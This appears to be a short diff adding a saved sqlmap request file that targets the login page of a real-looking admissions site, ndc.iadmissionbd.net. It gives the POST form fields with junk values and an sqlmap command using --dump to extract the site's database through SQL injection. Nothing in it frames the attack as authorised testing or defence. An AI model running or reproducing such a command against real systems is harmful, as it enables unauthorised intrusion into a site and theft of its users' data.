@@ -1,0 +1,3 @@
+http://ndc.iadmissionbd.net:80/login.php (POST)  # .\sqlmap.py -r .\postReqs\ndc --threads=10 --dump
+
+mobile_no=fghfghfgh&password=fghfghfh&submit=
